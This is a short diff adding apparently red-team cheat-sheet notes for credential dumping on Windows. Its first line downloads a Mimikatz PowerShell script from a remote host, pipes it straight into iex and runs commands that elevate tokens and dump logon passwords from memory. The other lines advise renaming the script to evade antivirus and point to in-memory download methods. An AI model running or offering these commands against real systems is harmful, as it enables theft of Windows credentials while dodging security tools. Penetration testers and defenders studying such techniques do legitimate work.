@@ -1,0 +1,3 @@
+curl https://{host}/{mimikatz-file}.ps1 | iex; {Invoke-mimikazt function} -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
+To AV evasion remember to rename the file without mimikatz name and the function on the script.
+if the server don't have curl, use iex command, see on useful-commands download-http folder on download-http-memory file
